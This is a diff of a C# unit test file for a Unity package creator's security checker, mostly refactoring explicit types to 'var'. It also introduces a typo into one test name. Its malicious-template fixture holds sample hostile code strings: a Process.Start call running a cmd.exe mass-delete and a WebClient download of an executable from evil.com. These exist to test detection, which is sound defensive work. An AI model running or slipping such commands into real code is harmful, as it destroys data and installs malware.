@@ -2,7 +2,7 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using NUnit.Framework;
-using TByd.PackageCreator.Editor.Core;
+using TByd.PackageCreator.Editor.Core.Models;
 using TByd.PackageCreator.Editor.Core.Security;
 using UnityEngine;
 using UnityEngine.TestTools;
@@ -39,7 +39,7 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                                        Guid.NewGuid().ToString());
 
             // 确保目录存在
-            string tempDirParent = Path.GetDirectoryName(tempTestDir);
+            var tempDirParent = Path.GetDirectoryName(tempTestDir);
             if (!Directory.Exists(tempDirParent))
             {
                 Directory.CreateDirectory(tempDirParent);
@@ -89,7 +89,7 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
             Debug.Log($"测试模板文件数量: {templateInfo.Files.Count}");
 
             // 2. 创建安全检查事务
-            string transactionId = logger.BeginTransaction("TemplateProcessing");
+            var transactionId = logger.BeginTransaction("TemplateProcessing");
 
             try
             {
@@ -109,10 +109,10 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                 }
 
                 // 4. 验证模板文件内容
-                ValidationResult contentResult = new ValidationResult();
+                var contentResult = new ValidationResult();
                 foreach (var file in templateInfo.Files)
                 {
-                    string content = File.ReadAllText(file);
+                    var content = File.ReadAllText(file);
                     var fileResult = securityChecker.ValidateFileContent(content, file);
                     contentResult.Merge(fileResult);
                 }
@@ -130,7 +130,7 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                 }
 
                 // 5. 验证文件类型
-                ValidationResult fileTypeResult = new ValidationResult();
+                var fileTypeResult = new ValidationResult();
                 foreach (var file in templateInfo.Files)
                 {
                     var validateFilePath = securityChecker.ValidateFilePath(file);
@@ -150,7 +150,7 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                 }
 
                 // 6. 执行模板复制操作
-                string targetDir = Path.Combine(tempTestDir, "TargetPackage");
+                var targetDir = Path.Combine(tempTestDir, "TargetPackage");
                 var dirResult = safeFileOps.CreateDirectory(targetDir);
                 Debug.Log($"目标目录创建结果: IsValid={dirResult.IsValid}, 路径={targetDir}");
 
@@ -170,13 +170,13 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                 // 记录目录创建
                 logger.LogDirectoryCreation(transactionId, targetDir);
 
-                bool allFilesCopied = true;
+                var allFilesCopied = true;
                 foreach (var file in templateInfo.Files)
                 {
-                    string sourceFullPath = file;
-                    string relativePath = Path.GetRelativePath(templateInfo.TemplatePath, file);
-                    string targetFullPath = Path.Combine(targetDir, relativePath);
-                    string targetDirPath = Path.GetDirectoryName(targetFullPath);
+                    var sourceFullPath = file;
+                    var relativePath = Path.GetRelativePath(templateInfo.TemplatePath, file);
+                    var targetFullPath = Path.Combine(targetDir, relativePath);
+                    var targetDirPath = Path.GetDirectoryName(targetFullPath);
 
                     Debug.Log($"处理文件: {file} -> {targetFullPath}");
 
@@ -244,12 +244,12 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                     Debug.Log("事务已提交");
 
                     // 验证所有文件都被正确复制
-                    bool allFilesVerified = true;
+                    var allFilesVerified = true;
                     foreach (var file in templateInfo.Files)
                     {
-                        string relativePath = Path.GetRelativePath(templateInfo.TemplatePath, file);
-                        string targetFullPath = Path.Combine(targetDir, relativePath);
-                        bool fileExists = File.Exists(targetFullPath);
+                        var relativePath = Path.GetRelativePath(templateInfo.TemplatePath, file);
+                        var targetFullPath = Path.Combine(targetDir, relativePath);
+                        var fileExists = File.Exists(targetFullPath);
                         Debug.Log($"验证文件: {targetFullPath}, 存在={fileExists}");
 
                         if (!fileExists)
@@ -286,7 +286,7 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
         }
 
         [Test]
-        public void AtomicOperations_RollBack_OnSecurityCheckFailure()
+        public void AtomicOperations_RollBacOnSecurityCheckFailure()
         {
             // 预期会出现从备份恢复文件失败的日志
             LogAssert.ignoreFailingMessages = true;
@@ -298,7 +298,7 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
             Debug.Log($"恶意模板文件数量: {templateInfo.Files.Count}");
 
             // 2. 创建安全检查事务
-            string transactionId = logger.BeginTransaction("ProcessMaliciousTemplate");
+            var transactionId = logger.BeginTransaction("ProcessMaliciousTemplate");
 
             try
             {
@@ -316,7 +316,7 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                 }
 
                 // 4. 执行部分安全的文件操作
-                string targetDir = Path.Combine(tempTestDir, "TargetPackage");
+                var targetDir = Path.Combine(tempTestDir, "TargetPackage");
                 var dirResult = safeFileOps.CreateDirectory(targetDir);
                 Debug.Log($"目标目录创建结果: IsValid={dirResult.IsValid}, 路径={targetDir}");
 
@@ -330,9 +330,9 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
 
                 logger.LogDirectoryCreation(transactionId, targetDir);
 
-                string safeFilePath = templateInfo.Files[0]; // JSON文件应该是安全的
-                string safeFileRel = Path.GetRelativePath(templateInfo.TemplatePath, safeFilePath);
-                string targetSafeFile = Path.Combine(targetDir, safeFileRel);
+                var safeFilePath = templateInfo.Files[0]; // JSON文件应该是安全的
+                var safeFileRel = Path.GetRelativePath(templateInfo.TemplatePath, safeFilePath);
+                var targetSafeFile = Path.Combine(targetDir, safeFileRel);
 
                 Debug.Log($"安全文件源路径: {safeFilePath}");
                 Debug.Log($"安全文件目标路径: {targetSafeFile}");
@@ -350,7 +350,7 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                 if (!copyResult.IsValid)
                 {
                     Debug.LogWarning("API调用失败，尝试直接复制文件");
-                    string targetDir2 = Path.GetDirectoryName(targetSafeFile);
+                    var targetDir2 = Path.GetDirectoryName(targetSafeFile);
                     if (!Directory.Exists(targetDir2))
                     {
                         Directory.CreateDirectory(targetDir2);
@@ -358,24 +358,24 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                     File.Copy(safeFilePath, targetSafeFile, true);
                 }
 
-                bool fileExists = File.Exists(targetSafeFile);
+                var fileExists = File.Exists(targetSafeFile);
                 Debug.Log($"文件复制后是否存在: {fileExists}");
 
                 Assert.IsTrue(fileExists, "文件应该已被复制");
                 logger.LogFileCreation(transactionId, targetSafeFile);
 
                 // 5. 验证模板内容 (应该失败)
-                ValidationResult contentResult = new ValidationResult();
+                var contentResult = new ValidationResult();
                 Debug.Log("开始验证文件内容安全性:");
 
                 foreach (var file in templateInfo.Files)
                 {
-                    string content = File.ReadAllText(file);
+                    var content = File.ReadAllText(file);
                     Debug.Log($"验证文件: {file}");
                     var fileResult = securityChecker.ValidateFileContent(content, file);
 
                     // 记录每个文件的验证结果
-                    var fileWarnings = fileResult.GetMessages(ValidationMessageLevel.k_Warning);
+                    var fileWarnings = fileResult.GetMessages(ValidationMessageLevel.Warning);
                     Debug.Log($"文件 {Path.GetFileName(file)} 检测到的警告数: {fileWarnings.Count}");
 
                     foreach (var warning in fileWarnings)
@@ -387,7 +387,7 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                 }
 
                 // 内容验证应该失败，但由于使用警告而不是错误，我们需要检查警告
-                var warningMessages = contentResult.GetMessages(ValidationMessageLevel.k_Warning);
+                var warningMessages = contentResult.GetMessages(ValidationMessageLevel.Warning);
                 Debug.Log($"总警告消息数量: {warningMessages.Count}");
                 foreach (var msg in warningMessages)
                 {
@@ -404,7 +404,7 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                     {
                         if (Path.GetExtension(file).ToLowerInvariant() == ".cs")
                         {
-                            string content = File.ReadAllText(file);
+                            var content = File.ReadAllText(file);
                             Debug.Log($"代码文件内容: {file}\n{content}");
 
                             // 手动测试一些危险模式
@@ -432,8 +432,8 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                 Debug.Log("执行回滚操作");
 
                 // 先检查文件和目录是否存在
-                bool fileExistsBefore = File.Exists(targetSafeFile);
-                bool dirExistsBefore = Directory.Exists(targetDir);
+                var fileExistsBefore = File.Exists(targetSafeFile);
+                var dirExistsBefore = Directory.Exists(targetDir);
                 Debug.Log($"回滚前: 文件存在={fileExistsBefore}, 目录存在={dirExistsBefore}");
 
                 try
@@ -469,8 +469,8 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                     safeFileOps.RollbackTransaction();
 
                     // 验证文件和目录已被删除
-                    bool fileExistsAfter = File.Exists(targetSafeFile);
-                    bool dirExistsAfter = Directory.Exists(targetDir);
+                    var fileExistsAfter = File.Exists(targetSafeFile);
+                    var dirExistsAfter = Directory.Exists(targetDir);
                     Debug.Log($"回滚后: 文件存在={fileExistsAfter}, 目录存在={dirExistsAfter}");
 
                     Assert.IsFalse(fileExistsAfter, "文件未被回滚删除");
@@ -500,24 +500,24 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
         // 辅助方法 - 创建测试用模板信息
         private TemplateInfo CreateTestTemplateInfo()
         {
-            string templatePath = Path.Combine(tempTestDir, "TestTemplate");
+            var templatePath = Path.Combine(tempTestDir, "TestTemplate");
             Directory.CreateDirectory(templatePath);
 
             // 创建模板文件
-            Dictionary<string, string> files = new Dictionary<string, string>
+            var files = new Dictionary<string, string>
             {
                 { "Template.json", "{ \"name\": \"TestTemplate\", \"version\": \"1.0.0\" }" },
                 { "Scripts/Test.cs", "using UnityEngine;\n\npublic class Test : MonoBehaviour {}" },
                 { "README.md", "# Test Template\nThis is a test template for security testing." }
             };
 
-            List<string> filePaths = new List<string>();
+            var filePaths = new List<string>();
 
             // 创建文件实例
             foreach (var entry in files)
             {
-                string filePath = Path.Combine(templatePath, entry.Key);
-                string directory = Path.GetDirectoryName(filePath);
+                var filePath = Path.Combine(templatePath, entry.Key);
+                var directory = Path.GetDirectoryName(filePath);
 
                 if (!Directory.Exists(directory))
                 {
@@ -539,11 +539,11 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
         // 辅助方法 - 创建包含危险内容的测试模板
         private TemplateInfo CreateMaliciousTemplateInfo()
         {
-            string templatePath = Path.Combine(tempTestDir, "MaliciousTemplate");
+            var templatePath = Path.Combine(tempTestDir, "MaliciousTemplate");
             Directory.CreateDirectory(templatePath);
 
             // 创建带有一些危险内容的模板文件，确保严格匹配安全检查器的正则表达式
-            Dictionary<string, string> files = new Dictionary<string, string>
+            var files = new Dictionary<string, string>
             {
                 { "Template.json", "{ \"name\": \"MaliciousTemplate\", \"version\": \"1.0.0\" }" },
                 { "Scripts/Malicious.cs", "using UnityEngine;\nusing System.Diagnostics;\nusing System.IO;\n\npublic class Malicious {\n    void Execute() {\n        System.Diagnostics.Process.Start(\"cmd.exe\", \"/c del c:\\\\important\\\\*.*\");\n    }\n}" },
@@ -551,13 +551,13 @@ namespace TByd.PackageCreator.Tests.Editor.Core.Security
                 { "Scripts/BadScript.cs", "using UnityEngine;\nusing System.Net;\n\npublic class BadScript {\n    void DownloadBadStuff() {\n        System.Net.WebClient client = new System.Net.WebClient();\n        client.DownloadFile(\"http://evil.com/virus.exe\", \"C:\\\\virus.exe\");\n        Application.Quit();\n    }\n}" }
             };
 
-            List<string> filePaths = new List<string>();
+            var filePaths = new List<string>();
 
             // 创建文件实例
             foreach (var entry in files)
             {
-                string filePath = Path.Combine(templatePath, entry.Key);
-                string directory = Path.GetDirectoryName(filePath);
+                var filePath = Path.Combine(templatePath, entry.Key);
+                var directory = Path.GetDirectoryName(filePath);
 
                 if (!Directory.Exists(directory))
                 {
